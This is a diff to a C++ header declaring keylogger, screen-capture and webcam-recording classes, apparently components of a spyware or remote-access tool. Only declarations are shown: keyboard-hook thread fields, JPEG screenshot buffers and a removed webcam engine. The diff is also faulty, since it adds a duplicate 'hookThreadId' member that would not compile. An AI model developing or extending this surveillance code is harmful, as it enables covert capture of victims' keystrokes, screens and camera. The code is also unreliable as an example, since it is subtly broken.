@@ -42,14 +42,11 @@ class KeyloggerEngine {
     std::mutex bufferLock;
     std::string windowTitle, lastWindowTitle;
     DWORD hookThreadId = 0;
+    DWORD hookThreadId = 0;
 };
 
 class ScreenCapEngine {
     public:
-    static ScreenCapEngine& getInstance() {
-        static ScreenCapEngine instance;
-        return instance;
-    }
 
     // Return codes:
     //   0     = Success
@@ -67,31 +64,19 @@ class ScreenCapEngine {
     //   -5/-6 = CreateStreamOnHGlobal() failed (E_INVALIDARG/E_OUTOFMEMORY)
     //   -7/-8 = Second CreateStreamOnHGlobal() failed
     int MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize);
+    ScreenCapEngine() = default;
+    ~ScreenCapEngine() {}
     
     private:
-    ScreenCapEngine() {}
-    ~ScreenCapEngine() {}
+    int freelim = 0;
+
+    HDC hDC, hMemDC;
+    HBITMAP hBitmap;
+    char *memblock;
+    STATSTG *jpg_stat;
+    IStream *rawbitmap_stream, *jpg_stream;
+
     ScreenCapEngine(const ScreenCapEngine&) = delete;
     ScreenCapEngine& operator=(const ScreenCapEngine&) = delete;
-
-    class leblanc;
-    std::vector<long long> linehash;
-};
-
-//width, height = 0 -> size from source
-struct VideoConfig {
-    unsigned int width, height;
-    unsigned int fps;
-    unsigned int bitrate;
-    GUID encodingFormat = MFVideoFormat_H264;
-};
-
-class WebcamEngine {
-    public:
-
-    WebcamEngine() = default;
-    bool run(int millisecond, int fps, std::string*);
-
-    private:
-    class neeko;
+    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 };
